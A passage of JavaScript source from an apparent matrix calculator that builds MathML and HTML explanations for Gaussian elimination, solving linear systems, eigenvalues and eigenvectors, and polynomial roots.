    mstr += "<mi>X</mi><mo>=</mo><mrow><msup><mi>A</mi><mrow><mo>&minus;</mo><mn>1</mn></mrow></msup><mo>&times;</mo><mi>B</mi></mrow><mo>=</mo><mrow>" + new Expression.Matrix(c).toMathML(printOptions) + "<mo>&times;</mo>" + new Expression.Matrix(b).toMathML(printOptions) + "</mrow><mo>=</mo>" + new Expression.Matrix(c.multiply(b)).toMathML(printOptions);
    mstr += "</math>";
    mstr += "</div>";
  } else {
    mstr += i18n.toSolveSystemByInverseMatrixMethodCoefficientMatrixShouldHaveNonZeroDeterminant;
    mstr += createDetailsSummary(printOptions.idPrefix, [{type: m.getDeterminantEventType("inverse").type, matrix: m.toString(), second: undefined}]);
    mstr += "<div class=\"for-details\"></div>";
  }
  return mstr;
};

//----------Gauss
// getting row echelon form without columns swapping

Expression.rowReduceChangeToHTML = function (change, printOptions, containerId, k, stepCondition) {
  var multiplier = change.type === "reduce" ? change.oldMatrix.e(change.targetRow, change.pivotColumn).divide(change.oldMatrix.e(change.pivotRow, change.pivotColumn)) : undefined;
  var areBracketsRequired = change.type === "reduce" ? multiplier.getPrecedence(multiplier) !== Expression.ZERO.getPrecedence() : undefined; //? not simple
  var jT = "<code>" + (change.targetRow + 1).toString() + "</code>";
  var iT = "<code>" + (change.pivotRow + 1).toString() + "</code>";
  var tooltip = (change.type === "swap-negate" ? i18n.eliminationDetails.rowSwapNegate.replace(/\$\{\-1\}/g, "<math>" + "<mo>&minus;</mo><mn>1</mn>" + "</math>").replace(/\$\{j\}/g, jT).replace(/\$\{i\}/g, iT) : "") +
                (change.type === "swap" ? i18n.eliminationDetails.rowSwap.replace(/\$\{j\}/g, jT).replace(/\$\{i\}/g, iT) : "") +
                (change.type === "divide" ? i18n.eliminationDetails.rowDivision.replace(/\$\{a\}/g, "<code>" + "<math>" + change.oldMatrix.e(change.pivotRow, change.pivotColumn).toMathML(printOptions) + "</math>" + "</code>").replace(/\$\{j\}/g, jT).replace(/\$\{i\}/g, iT) : "") +
                (change.type === "reduce" ? i18n.eliminationDetails.rowSubtraction.replace(/\$\{a\}/g, "<code>" + "<math>" + (areBracketsRequired ? "<mrow><mo>(</mo>" : "") + multiplier.toMathML(printOptions) + (areBracketsRequired ? "<mo>)</mo></mrow>" : "") + "</math>" + "</code>").replace(/\$\{j\}/g, jT).replace(/\$\{i\}/g, iT) : "");

  var text = "";
  var cellId = function (containerId, k, i, j) {
    return containerId + "-" + k.toString() + "-" + i.toString() + "-" + j.toString();
  };
  var questionId = containerId + "-" + k.toString() + "-" + "question-mark";
  var tooltipId = questionId + "-" + "tooltip";

  k += 1; //!
  for (var i = 0; i < change.oldMatrix.cols(); i += 1) {
    if (change.type === "reduce" || change.type === "divide") {
      var divId = cellId(containerId, k, change.targetRow, i) + "-" + "tooltip";
      var highlight = "<a class=\"a-highlight\" data-for=\"" + cellId(containerId, k, change.targetRow, i) + "\" data-highlight=\"" +
                        "#" + cellId(containerId, k - 1, change.pivotRow, change.pivotColumn) + ", " +
                        "#" + cellId(containerId, k - 1, change.targetRow, i) + ", " +
                        (change.type === "reduce" ? "#" + cellId(containerId, k - 1, change.targetRow, change.pivotColumn) + ", " : "") +
                        (change.type === "reduce" ? "#" + cellId(containerId, k - 1, change.pivotRow, i) + ", " : "") +
                        "#" + cellId(containerId, k, change.targetRow, i) + "\"></a>";
      var tooltips = "<a class=\"a-tooltip\" data-for=\"" + cellId(containerId, k, change.targetRow, i) + "\" data-tooltip=\"" + divId + "\"></a>";
      text += "<div id=\"" + divId + "\">" +
              "<math>" +
              Expression.p("a_(" + (change.targetRow + 1) + "," + (i + 1) + ")=" + (change.type === "reduce" ? "(b-(c/a)*d)" : "(b*(1/a))") + "=r", {
                a: change.oldMatrix.e(change.pivotRow, change.pivotColumn),
                b: change.oldMatrix.e(change.targetRow, i),
                c: change.oldMatrix.e(change.targetRow, change.pivotColumn),
                d: change.oldMatrix.e(change.pivotRow, i),
                r: change.newMatrix.e(change.targetRow, i)
              }, printOptions) +
              "</math>" +
              "</div>" +
              tooltips +
              highlight;
    } else if (change.type === "swap" || change.type === "swap-negate") {
      text  += "<a class=\"a-highlight\" data-for=\"" + cellId(containerId, k, change.targetRow, i) + "\" data-highlight=\"" +
               "#" + cellId(containerId, k - 1, change.pivotRow, i) + ", " +
               "#" + cellId(containerId, k - 1, change.targetRow, i) + ", " +
               "#" + cellId(containerId, k, change.targetRow, i) + "\"></a>";
      text += "<a class=\"a-highlight\" data-for=\"" + cellId(containerId, k, change.pivotRow, i) + "\" data-highlight=\"" +
              "#" + cellId(containerId, k - 1, change.targetRow, i) + ", " +
              "#" + cellId(containerId, k - 1, change.pivotRow, i) + ", " +
              "#" + cellId(containerId, k, change.pivotRow, i) + "\"></a>";
    }
  }

  return "<span class=\"nowrap\">" +
         "<math>" +
         new Expression.Matrix(change.oldMatrix).toMathML(Object.assign({}, printOptions, {
           columnlines: printOptions.columnlines,
           cellIdGenerator: function (i, j) {
             return cellId(containerId, k - 1, i, j);
           },
           pivotCell: change.type === "swap" || change.type === "swap-negate" ? undefined : {
             i: change.pivotRow,
             j: change.pivotColumn
           }
         })) +
         "</math>" +
         "  <span class=\"arrow-with-label\" data-custom-paint=\"arrow-with-label\" data-type=\"" + change.type + "\" data-start=\"" + change.pivotRow + "\" data-end=\"" + change.targetRow + "\">" +
         "    <div class=\"arrow\">" +
         (change.type === "swap" || change.type === "swap-negate" || change.pivotRow < change.targetRow ? "      <div class=\"arrow-head-bottom\"></div>" : "") +
         (change.type === "swap" || change.type === "swap-negate" || change.pivotRow > change.targetRow ? "      <div class=\"arrow-head-top\"></div>" : "") +
         (change.type !== "divide" ? "      <div class=\"arrow-line\"></div>" : "") +
         "    </div>" +
         "    <div class=\"label\">" +
         (change.type === "swap" ? "" : (change.type === "swap-negate" ? "" : "<math>" + (change.type === "divide" ? "<mo>&times;</mo>" + "<mrow><mo>(</mo>" + Expression.ONE.divide(change.oldMatrix.e(change.targetRow, change.pivotColumn)).toMathML(printOptions) + "<mo>)</mo></mrow>" : "<mo>&times;</mo>" + "<mrow><mo>(</mo>" + multiplier.negate().toMathML(printOptions) + "<mo>)</mo></mrow>") + "</math>")) +
         "    </div>" +
         "  </span>" +
         "</span>" +
         "<span class=\"relative\">" +
         "<math>" +
         "<mpadded width=\"+0.8em\" lspace=\"+0.4em\">" +
         "<munder>" + 
         "<mo stretchy=\"false\">~</mo>" +
         (stepCondition.isTrue() ? "" : "<munder>") +
         "<mrow>" +
         ((change.type === "swap-negate" ? "${i}<mo>&harr;</mo><mrow><mo>&minus;</mo>${j}</mrow>" : "") +
          (change.type === "swap" ? "${i}<mo>&harr;</mo>${j}" : "") +
          (change.type === "divide" ? "${j}<mo>&#x2215;</mo><mrow><mo>(</mo>${a}<mo>)</mo></mrow><mo>&rarr;</mo>${j}".replace(/\$\{a\}/g, change.oldMatrix.e(change.pivotRow, change.pivotColumn).toMathML(printOptions)) : "") +
          (change.type === "reduce" ? "<mrow>${j}<mo>&minus;</mo><mrow>${a}<mo>&times;</mo>${i}</mrow></mrow><mo>&rarr;</mo>${j}".replace(/\$\{a\}/g, (areBracketsRequired ? "<mrow><mo>(</mo>" : "") + (printOptions.isLUDecomposition != undefined ? "<mrow mathbackground=\"#80FF80\">" : "") + multiplier.toMathML(printOptions) + (printOptions.isLUDecomposition != undefined ? "</mrow>" : "") + (areBracketsRequired ? "<mo>)</mo></mrow>" : "")) : ""))
            .replace(/\$\{j\}/g, getMatrixRowDenotation(change.targetRow + 1))
            .replace(/\$\{i\}/g, getMatrixRowDenotation(change.pivotRow + 1)) +
         "</mrow>" +
         (stepCondition.isTrue() ? "" : stepCondition.toMathML(printOptions)) +
         (stepCondition.isTrue() ? "" : "</munder>") +
         "</munder>" +
         "</mpadded>" +
         "</math>" +
         (tooltip !== "" ? "<a class=\"question-icon\" tabindex=\"0\" id=\"" + questionId + "\">?</a><a class=\"a-tooltip\" data-for=\"" + questionId + "\" data-tooltip=\"" + tooltipId + "\"></a><div id=\"" + tooltipId + "\" hidden>" + tooltip + "</div>" : "") +
         (text !== "" ? "<span hidden>" + text + "</span>" : "") +
         "</span>";
};



Expression.rowReductionGaussJordanMontante = function (matrix, method, usage, printOptions, resultCallback, flag0) {
  flag0 = flag0 == undefined ? false : flag0;
  var containerId = printOptions.idPrefix + "-" + Expression.id();
  var html = "";
  var k = 0;
  html += "<div class=\"math-block\">";
  var outputTailMatrix = function (stoppedAtRow, matrix) {
    html += "<math>";
    html += new Expression.Matrix(matrix).toMathML(Object.assign({}, printOptions, {
      cellIdGenerator: function (i, j) {
        return containerId + "-" + k.toString() + "-" + i.toString() + "-" + j.toString();
      },
      highlightRow: stoppedAtRow
    }));
    html += "</math>";
    html += "</div>";
    k += 1;
  };
  //2017-01-04:
  var oldCondition = Condition.TRUE;
  //---
  var result = matrix.toRowEchelonXXX(method, usage, function (change) {
    //2017-09-29:
    var stepCondition = Condition.TRUE;
    if (usage !== "determinant" && usage !== "inverse") { // not a "determinant" or a "inverse" calculation
      //2017-01-04:
      var pivot = change.oldMatrix.e(change.pivotRow, change.pivotColumn);
      stepCondition = Condition.TRUE.andNotZero(pivot);
      if (!stepCondition.isTrue()) {//?
        oldCondition = oldCondition.andNotZero(pivot);
      }
    }
    //---
    // TODO: remove stepCondition - ?
    var rowReduceChangeToHTML = method === Matrix.GaussMontante ? Expression.rowReduceChangeToHTMLMontante : Expression.rowReduceChangeToHTML;
    html += rowReduceChangeToHTML(change, printOptions, containerId, k, stepCondition);
    k += 1;
  }, usage !== "determinant" && usage !== "inverse" && !flag0 ? Condition.TRUE : undefined);
  
  var w = function (result) {
    if (result.c1 == undefined && result.c2 == undefined) {
      outputTailMatrix(result.stoppedAtRow, result.matrix);
      html += resultCallback({
        matrix: result.matrix,
        stoppedAtRow: result.stoppedAtRow,
        condition: flag0 ? oldCondition : result.condition // TODO: use or remove ?
      });
    } else {
      outputTailMatrix(-1, result.matrix);
      html += "<ol>";
      html += "<li>";
      html += "<div>";
      html += "<math>";
      html += result.c1.toMathML(printOptions);
      html += "</math>";
      html += "</div>";
      html += "<div>";
      w(result.a1());
      html += "</li>";
      html += "<li>";
      html += "<div>";
      html += "<math>";
      html += result.c2.toMathML(printOptions);
      html += "</math>";
      html += "</div>";
      html += "<div>";
      w(result.a2());
      html += "</li>";
      html += "</ol>";
    }
  };

  w(result);

  return html;
};

Expression.solveByGaussNext = function (ms, printOptions, variableNames) {
  var condition = ms.condition;//?
  var m = ms.matrix;

//!?  
  if (condition != undefined) {
    m = m.map(function (e, i, j) {
      return condition.andNotZero(e).isFalse() ? Expression.ZERO : e;
    });
  }

  
  // 1. Throwing of null strings - they will be below, but checking: if we find a zero, which at the end has a non-zero, then there are no solutions!;
  var noSolutions = ms.stoppedAtRow !== -1;
  //!hack
  if (variableNames == undefined) {
    variableNames = makeDefaultVariableNames(m.cols() - 1);
  }
  if (noSolutions) {
    return {
      html: "<div>" +
            "<math>" + outSystem(printOptions, m, variableNames) + "</math>" +
            "</div>" +
            "<div>" + i18n.thereAreNoSolutions + "</div>"
    };
  }

  var isHomogeneous = function (m) {
    for (var i = 0; i < m.rows(); i += 1) {
      if (!m.e(i, m.cols() - 1).equals(Expression.ZERO)) {
        return false;
      }
    }
    return true;
  };

  // (?) TODO: allow users to specify "free" variables

  var containerId = printOptions.idPrefix + "-" + Expression.id();
  var systemId = containerId + "-" + "system_1";

  var mstr = "";
  
  if (!m.eql(Matrix.Zero(m.rows(), m.cols()))) {
  mstr += "<div class=\"anchor\" id=\"" + systemId + "\">" +
          "<table role=\"presentation\" class=\"system-table\">" +
          "<tr>" +
          "<td>" +
          "<math>" + outSystem(printOptions, m, variableNames) + "</math>" +
          "</td>" +
          "<td>" +
          "<a href=\"#" + systemId + "\">(1)</a>" +
          "</td>" +
          "</tr>" +
          "</table>" +
          "</div>";
  }

  var isEquals = function (a, b) {
    if (a.length !== b.length) {
      return false;
    }
    for (var i = 0; i < a.length; i += 1) {
      if (!(a[i] instanceof NonSimplifiedExpression) || !(b[i] instanceof NonSimplifiedExpression)) {
        throw new TypeError();
      }
      if (!a[i].e.equals(b[i].e)) { // comparision without "simplification"
        return false;
      }
    }
    return true;
  };
    
    var nsVariableNames = new Array(m.cols() - 1);
    for (var i = 0; i < m.cols() - 1; i += 1) {
      nsVariableNames[i] = new NonSimplifiedExpression(new Expression.Symbol(variableNames[i]));
    }

    mstr += "<ul>";



    m = Matrix.solveByGaussNext(m, function (m, oldMatrix1, oldMatrix2, i, j) {
        //?
        //if (condition != undefined) {
        //condition = condition.andNotZero(oldMatrix1.e(i, j));
        //}
        //?

        mstr += "<li>";
        mstr += "<div>";
        mstr += i18n.fromEquationIFindVariable
                  .replace(/\$\{i\}/g, "<math>" + "<mn>" + (i + 1).toString() + "</mn>" + "</math>")
                  .replace(/\$\{x\}/g, "<math>" + new Expression.Symbol(variableNames[j]).toMathML(printOptions) + "</math>")
                  .replace(/\$\{#system_1\}/g, "<a href=\"#" + systemId + "\">(1)</a>");
        mstr += "</div>";
        mstr += "<div>";



        // We need to wrap using NonSimplifiedExpression to use in `isEquals`
        var equationSymbols1 = new Array(m.cols() - 1);
        var equationSymbols2 = new Array(m.cols() - 1);
        for (var k = 0; k < m.cols() - 1; k += 1) {
          var v = new NonSimplifiedExpression(nsVariableNames[k].e);
          equationSymbols1[k] = v;
          equationSymbols2[k] = v;
          if (k > j && !oldMatrix1.e(i, k).equals(Expression.ZERO)) {
            var pivotRowK = Matrix.getPivotRow(oldMatrix1, k);
            var y = pivotRowK === -1 ? v : new NonSimplifiedExpression(polynomialToExpression3(oldMatrix1, pivotRowK, nsVariableNames));
            equationSymbols2[k] = y;
          }
        }

        mstr += "<math>";

        var leftPartCoefficient = oldMatrix1.e(i, j);
        var leftPartVariable = new Expression.Symbol(variableNames[j]);
        var leftPart = (leftPartCoefficient.equals(Expression.ONE) ? leftPartVariable : new Expression.Multiplication(leftPartCoefficient, leftPartVariable));
        mstr += leftPart.toMathML(printOptions);
        mstr += "<mo>=</mo>";

        var beforeSubstitution = polynomialToExpression3(oldMatrix1, i, equationSymbols1).toMathML(Object.assign({}, printOptions, {printId: true}));
        mstr += beforeSubstitution;

        var afterSubstitution = polynomialToExpression3(oldMatrix1, i, equationSymbols2).toMathML(Object.assign({}, printOptions, {printId: true}));
        if (!isEquals(equationSymbols1, equationSymbols2)) {
          mstr += "<mo>=</mo>";
          mstr += afterSubstitution;
        }

        var afterSimplification = polynomialToExpression3(oldMatrix2, i, nsVariableNames).toMathML(printOptions);
        if (!isEquals(equationSymbols2, nsVariableNames)) {
          mstr += "<mo>=</mo>";
          mstr += afterSimplification;
        }

        mstr += "</math>";

        mstr += "<div hidden>";
        for (var k = 0; k < nsVariableNames.length; k += 1) {
          if (!equationSymbols2[k].e.equals(nsVariableNames[k].e)) {
            mstr += "<a class=\"a-highlight\" data-for=\"" + equationSymbols2[k].getId() + "\" data-highlight=\"" + equationSymbols1[k].getId() + "\"></a>";
          }
        }
        mstr += "</div>";

        var afterDivision = polynomialToExpression3(m, i, nsVariableNames).toMathML(printOptions);
        if (!oldMatrix2.e(i, j).equals(Expression.ONE)) {
          mstr += "<div>";
          //mstr += "<b>"; // does not work in Firefox 52 (Windows XP) with MathML
          mstr += "<math>";
          mstr += "<mstyle mathvariant=\"bold\">";
          mstr += new Expression.Symbol(variableNames[j]).toMathML(printOptions);
          mstr += "<mo>=</mo>";
          mstr += afterDivision;
          mstr += "</mstyle>";
          mstr += "</math>";
          //mstr += "</b>";
          mstr += "</div>";
        }

        mstr += "</div>";
        mstr += "</li>";
    });
    mstr += "</ul>";

    var solutionsExpressions = new Array(m.cols() - 1);
    for (var i = 0; i < m.cols() - 1; i += 1) {
      solutionsExpressions[i] = Matrix.getPivotRow(m, i) === -1 ? nsVariableNames[i] : new NonSimplifiedExpression(polynomialToExpression3(m, Matrix.getPivotRow(m, i), nsVariableNames));
    }
    var solutionsExpressionsData = new Array(1);
    solutionsExpressionsData[0] = solutionsExpressions;
    var solutionsExpressionsMatrix = new Matrix(solutionsExpressionsData).transpose();

    if (true) {
      mstr += "<div>" + i18n.answer + "</div>";
      mstr += "<div class=\"like-table\">";
      mstr += "<ul>";
      for (var i = 0; i < m.cols() - 1; i += 1) {
        mstr += "<li>";
        mstr += "<math>";
        mstr += new Expression.Symbol(variableNames[i]).toMathML(printOptions) + "<mo>=</mo>" + solutionsExpressions[i].toMathML(printOptions);
        mstr += "</math>";
        mstr += "</li>";
      }
      mstr += "</ul>";
      //?
      if (condition != undefined && !condition.isTrue()) {
        mstr += "<math>";
        mstr += "<mrow><mo>(</mo>";
        mstr += condition.toMathML(printOptions);
        mstr += "<mo>)</mo></mrow>";
        mstr += "</math>";
        if (typeof hit === "function") {
          hit({condition: condition.toString() + "::" + m.toString()});
        }
      }
      //?
      mstr += "</div>";
    }
    if (true) {
      //TODO: remove - ?
      mstr += "<div>" + i18n.generalSolution + " " + "<math>" + "<mi>X</mi><mo>=</mo>" + new Expression.Matrix(solutionsExpressionsMatrix).toMathML(printOptions) + "</math>" + "</div>";
    }
    
    if (isHomogeneous(m)) {
      var solutionSet = Matrix.getSolutionSet(m);
      if (solutionSet.basisVectors.length > 0) {
        var fundamentalSystemHTML = '';
        fundamentalSystemHTML += '<math>';
        fundamentalSystemHTML += '<mrow>';
        fundamentalSystemHTML += '<mo stretchy="false">{</mo>';
        fundamentalSystemHTML += solutionSet.basisVectors.length !== 1 ? '<mrow>' : '';
        for (var i = 0; i < solutionSet.basisVectors.length; i += 1) {
          var basisVector = new Expression.Matrix(solutionSet.basisVectors[i]);
          var freeVariable = nsVariableNames[solutionSet.variables[i]];
          fundamentalSystemHTML += (i !== 0 ? '<mo>+</mo>' : '');
          fundamentalSystemHTML += '<mrow>' + freeVariable.toMathML(printOptions) + '<mo>&times;</mo>' + basisVector.toMathML(printOptions) + '</mrow>';
        }
        fundamentalSystemHTML += solutionSet.basisVectors.length !== 1 ? '</mrow>' : '';
        fundamentalSystemHTML += '<mo stretchy="false">}</mo>';
        fundamentalSystemHTML += '</mrow>';
        fundamentalSystemHTML += '</math>';
        mstr += '<div>' + i18n.fundamentalSystem + ' ' + fundamentalSystemHTML + '</div>';
      }
    }
    return {
      html: mstr
    };

};

Expression.Details.add({
  type: "solve-using-Cramer's-rule",
  i18n: function () {
    return i18n.solveByCrammer;
  },
  minRows: 1,
  priority: 1,
  callback: function (printOptions, matrix, variableNames) {
    return solveUsingCramersRule(printOptions, matrix, variableNames);
  }
});
Expression.Details.add({
  type: "solve-using-inverse-matrix-method",
  i18n: function () {
    return i18n.solveByInverse;
  },
  minRows: 1,
  priority: 1,
  callback: function (printOptions, matrix, variableNames) {
    return solveUsingInverseMatrixMethod(printOptions, matrix, variableNames);
  }
});

//TODO: ?
Polynomial.toM1 = function (c, np, roots) {
  var e = undefined;
  if (!c.equals(Expression.ONE)) {
    if (!c.equals(Expression.ONE.negate())) {
      c = new NonSimplifiedExpression(c);
    }
    e = e != undefined ? new Expression.Multiplication(e, c) : c;
  }
  if (np.getDegree() === 0) {
    var x = np.getCoefficient(0);
    if (!x.equals(Expression.ONE)) {
      e = e != undefined ? new Expression.Multiplication(x, e) : x;
    }
  }
  for (var i = 0; i < roots.length; i += 1) {
    var p = Polynomial.of(roots[i].negate(), Expression.ONE);
    //html += "<mrow><mo>(</mo>" +  + "<mo>)</mo></mrow>";
    var w = new Expression.Polynomial(p);
    e = e != undefined ? new Expression.Multiplication(e, w) : w;
  }
  if (roots.length === 0 || np.getDegree() !== 0) {
    //TODO: remove brackets
    var w = new Expression.Polynomial(np);
    e = e != undefined ? new Expression.Multiplication(e, w) : w;
    //html += "<mrow><mo>(</mo>" + np.toMathML(printOptions) + "<mo>)</mo></mrow>";
  }
  return e;
};

// -------------------------------------------- vectors -------------------------------------------

var polynomialRootsCallback = function (info, printOptions) {
  var link = "";
  if (info.type === "useTheRationalRootTest") {
    link = i18n.useTheRationalRootTestLink;
  } else if (info.type === "solveQuadraticEquation") {
    link = i18n.solveQuadraticEquationLink;
  } else if (info.type === "solvePalindromicEquaion") {
    link = i18n.solvePalindromicEquaionLink;
  } else if (info.type === "(ax+b)**n") {
    link = i18n.binomialTheoremLink;
  } else if (info.type === "solveCubicEquation") {//?
    //TODO:
    link = i18n.solveCubicEquationLink;
  } else if (info.type === "methodOfKronecker") {//?
    link = i18n.methodOfKroneckerLink;
  } else if (info.type === "applyDifferenceOfSquaresRule") {
    link = i18n.applyDifferenceOfSquaresRuleLink;
  } else if (info.type === "applyDifferenceOfCubesRule") {
    link = i18n.applyDifferenceOfCubesRuleLink;
  } else if (info.type === "applyDifferenceOfNthPowersRule") {
    link = i18n.applyDifferenceOfNthPowersRuleLink;
  }
  var result = "";
  if (info.type === "t = x^g" || (link === "" && (info.type === "applyDifferenceOfSquaresRule" || info.type === "applyDifferenceOfCubesRule" || info.type === "applyDifferenceOfNthPowersRule"))) {
    var variableName = printOptions.polynomialVariable;
    result += "<munder><mo>=</mo><mrow><mi>t</mi><mo>=</mo><msup><mi>${x}</mi><mn>${g}</mn></msup></mrow></munder>".replace(/\$\{x\}/g, variableName).replace(/\$\{g\}/g, info.g);
  } else {
    result += (link === "" ? "<mo>=</mo>" : "<munder><mo>=</mo><mtext>" + link + "</mtext></munder>");
  }
  result += Polynomial.toM1(info.content, info.newPolynomial, info.roots).toMathML(printOptions);
  return result;
};

Expression.getEigenvaluesWithSteps = function (printOptions, matrix) {
  var variableName = "\u03BB";
  var lambda = new Expression.Symbol(variableName);
  printOptions = Object.assign({}, printOptions, {
    polynomialVariable: lambda
  });

  var steps = "";
  var tmp = Expression.getEigenvalues(matrix, printOptions.fractionDigits, function (info) {
    steps += polynomialRootsCallback(info, printOptions);
  });
  var characteristicPolynomial = tmp.characteristicPolynomial;
  var eigenvalues = tmp.eigenvalues;
  var multiplicities = tmp.multiplicities;

//?
  var html = "";
  //TODO: improve i18n (links to Wikipedia)
  var matrixWithLambdas = matrix.map(function (element, i, j) {
    return new NonSimplifiedExpression(i === j ? new Expression.Addition(element, new Expression.Negation(lambda)) : element);
  });
  html += "<div>";
  html += i18n.findEigenvaluesFromTheCharacteristicPolynomial;
  html += "</div>";
  html += "<div>";

  html += "<math>";
  html += new Expression.Determinant(new Expression.Matrix(matrixWithLambdas)).toMathML(printOptions) + "<mo>=</mo>" + characteristicPolynomial.toMathML(printOptions);
  html += steps;
  html += "</math>";
  html += "</div>";
  //?
  //TODO: fix
  html += createDetailsSummary(printOptions.idPrefix, [{type: "determinant", matrix: matrixWithLambdas.toString(), second: undefined}]);
  //?
  html += "<ol>";
  var n = -1;
  while (++n < eigenvalues.length) {
    var eigenvalue = eigenvalues[n];
    var equalsMathML = "<mo>" + (eigenvalue.isExact() ? "=" : "&asymp;") + "</mo>";
    //TODO: output algebraic multiplicity

    html += "<li>";
    html += "<math>";
    html += "<msub><mi>&lambda;</mi><mn>" + (n + 1) + "</mn></msub>";
    html += equalsMathML;
    html += eigenvalue.toMathML(printOptions);
    html += "</math>";
    html += "</li>";
  }
  html += "</ol>";
  return {eigenvalues: eigenvalues, multiplicities: multiplicities, html: html};
};

Expression.getEigenvectorsWithSteps = function (printOptions, matrix, eigenvalues) {
  var eigenvectors = [];

  var html = "";

  html += "<div>";
  html += i18n.findEigenvectorsForEveryEigenvalue;
  html += "</div>";

  html += "<ol>";
  for (var i = 0; i < eigenvalues.length; i += 1) {
    html += "<li>";

    var mm = matrix.subtract(Matrix.I(matrix.cols()).scale(eigenvalues[i])); // matrix - E * eigenvalue
    var fullMatrix = mm.augment(Matrix.Zero(mm.cols(), 1));

    var equalsMathML = "<mo>" + (eigenvalues[i].isExact() ? "=" : "&asymp;") + "</mo>";
    
    var lambdaMathML = "<msub><mi>&lambda;</mi><mn>" + (i + 1) + "</mn></msub>";
    
    // TODO: fix output for diagonalization - instead of `X = {{0}, {c_1}, {0}}` should be `... let c_1 = 1, then X = {{0}, {1}, {0}}`
    html += "<div class=\"anchor\" id=\"" + (printOptions.idPrefix + "-eigenvalue-" + (i + 1)) + "\">";
    html += "<math>";
    html += lambdaMathML;
    html += equalsMathML;
    html += eigenvalues[i].toMathML(printOptions);
    html += "</math>";
    html += "</div>";

    //TODO: syncronize the ExpressionParser with i18n.identityMatrixDenotation
    //TODO: a tooltip for identityMatrixDenotation - identity Matrix
    //TODO: invisible times (&it;) -> middle dot - ?

    html += "<div>";
    html += "<math>";
    html += "<mrow><mi>A</mi><mo>&minus;</mo><mrow>" + lambdaMathML + "<mo>&it;</mo><mi>" + i18n.identityMatrixDenotation + "</mi></mrow></mrow>";
    html += equalsMathML;
    html += new Expression.Matrix(mm).toMathML(printOptions);
    html += "</math>";
    html += "</div>";

    // Av=\lambda v
    html += "<div>";
    html += "<math><mrow><mi>A</mi><mo>&it;</mo><mi>v</mi></mrow><mo>=</mo><mrow><mi>&lambda;</mi><mo>&it;</mo><mi>v</mi></mrow></math>";
    html += " ";
    html += i18n.eigenvalueEquationLink; //TODO: remove the link - ?
    html += "</div>";
    // (A-\lambda E)v=0
    html += "<div>";
    html += "<math><mrow><mrow><mo>(</mo><mrow><mi>A</mi><mo>&minus;</mo><mrow><mi>&lambda;</mi><mo>&it;</mo><mi>" + i18n.identityMatrixDenotation + "</mi></mrow></mrow><mo>)</mo></mrow><mo>&it;</mo><mi>v</mi></mrow><mo>=</mo><mn>0</mn></math>";
    html += "</div>";

    html += "<div>";
    //TODO: text says by "Gaussian Elimination", but really we solve it by Gauss-Jordan elimination...
    html += i18n.letsSolveHomogeneouseSystem;
    html += "</div>";

    //TODO:
    //html += createDetailsSummary(printOptions.idPrefix, [{type: "solve", matrix: fullMatrix.toString(), second: undefined}]);

    //TODO: Matrix.GaussMontante

    var variableNames = makeDefaultVariableNames(fullMatrix.cols() - 1);
    var solutionSet = undefined;
    var solutionHTML = "";
    solutionHTML += Expression.rowReductionGaussJordanMontante(fullMatrix, Matrix.GaussJordan, "solving", Object.assign({}, printOptions, {columnlines: -1}), function (result) {
      var tmp = Expression.solveByGaussNext(result, printOptions, variableNames);
      solutionSet = Matrix.getSolutionSet(result.matrix);
      return tmp.html;
    }, true);

    html += "<div>" + solutionHTML + "</div>";

    html += "<div>";
    for (var j = 0; j < solutionSet.basisVectors.length; j += 1) {
      var eigenvector = solutionSet.basisVectors[j];
      eigenvectors.push(eigenvector);
      var index = eigenvectors.length;
      //TODO: <li> - ?
      html += j !== 0 ? "; " : "";
      html += i18n.Let;
      html += " ";
      for (var k = 0; k < solutionSet.variables.length; k += 1) {
        html += k !== 0 ? ", " : "";
        html += "<math>";
        html += new Expression.Symbol(variableNames[solutionSet.variables[k]]).toMathML(printOptions) + "<mo>=</mo>" + "<mn>" + (k === j ? 1 : 0) + "</mn>";
        html += "</math>";
      }
      html += ", ";
      html += "<div class=\"inline-block anchor\" id=\"" + (printOptions.idPrefix + "-eigenvector-" + index) + "\">";
      html += "<math>";
      html += "<mstyle mathvariant=\"bold\">";
      html += Expression.p("v_" + index + "=V", {V: new Expression.Matrix(eigenvector)}, printOptions);
      html += "</mstyle>";
      html += "</math>";
      html += "</div>";
    }
    html += "</div>";
    html += "</li>";
  }
  html += "</ol>";

  return {
    html: html,
    eigenvectors: eigenvectors
  };
};

// --------------------------------------------- end ----------------------------------------------




// --------------------------------------------- end ----------------------------------------------

// 1286

//TODO: remove ?
var polyfromtable = function (m) {
  var coefficients = new Array(m.cols());
  for (var i = 0; i < m.cols(); i += 1) {
    coefficients[i] = m.e(0, m.cols() - 1 - i);
  }
  return Polynomial.from(coefficients);
};


Expression.Details.add({
  type: "polynomial-roots",
  minRows: 1,
  callback: function (printOptions, matrix, second) {
    var polynomial = polyfromtable(matrix);
    var variable = second == undefined ? undefined : second.variable;

    variable = variable == undefined ? new Expression.Symbol("x") : variable;
    printOptions = Object.assign({}, printOptions, {
      polynomialVariable: variable
    });

    var steps = "";
    var tmp = Expression.getPolynomialRootsWithSteps(polynomial, printOptions.fractionDigits, function (info) {
      steps += polynomialRootsCallback(info, printOptions);
    });
    var uniqueRoots = tmp.uniqueRoots;
    var multiplicities = tmp.multiplicities;

    var html = "";
    html += "<div>";
    html += "<math>";
    html +=  polynomial.toMathML(printOptions);
    html += steps;
    html += "</math>";
    html += "</div>";
    html += "<div>";
    html += i18n.roots;
    if (uniqueRoots.length === 0) {
      html += " ? ";
    }
    html += "<ul>";
    for (var k = 0; k < uniqueRoots.length; k += 1) {
      var root = uniqueRoots[k];
      var multiplicity = multiplicities[k];
      for (var j = 0; j < multiplicity; j += 1) {
        html += "<li>" + "<math>" + (root.isExact() ? "" : "<mo>&asymp;</mo>") + root.toMathML(printOptions) + "</math>" + "</li>";
      }
    }
    html += "</ul>";
    html += "</div>";
    return html;
  }
});

Expression.Details.add({
  type: "polynomial-multiply",
  minRows: 1,
  callback: function (printOptions, matrix, second) {
    var pA = polyfromtable(matrix);
    var pB = polyfromtable(second.matrix);
    var result = pA.multiply(pB);
    return "<math>" +
           "<mrow>" +
           "<mrow><mo>(</mo>" + pA.toMathML(printOptions) + "<mo>)</mo></mrow>" +
           "<mo>&times;</mo>" +
           "<mrow><mo>(</mo>" + pB.toMathML(printOptions) + "<mo>)</mo></mrow>" +
           "</mrow>" +
           "<mo>=</mo>" +
           result.toMathML(printOptions) +
           "</math>";
  }
});

RPN.getPositionInfo = function () {
  return {
    input: ExpressionParser.input,
    startPosition: ExpressionParser.startPosition,
    endPosition: ExpressionParser.endPosition,
    p: RPN.p
  };
};
RPN.getMatrix = function (s) {
  // TODO: insertion with drag and drop should not freeze all because of calculations
  var matrix = undefined;

  if (matrix == undefined) {
    //TODO: fix or remove - ?
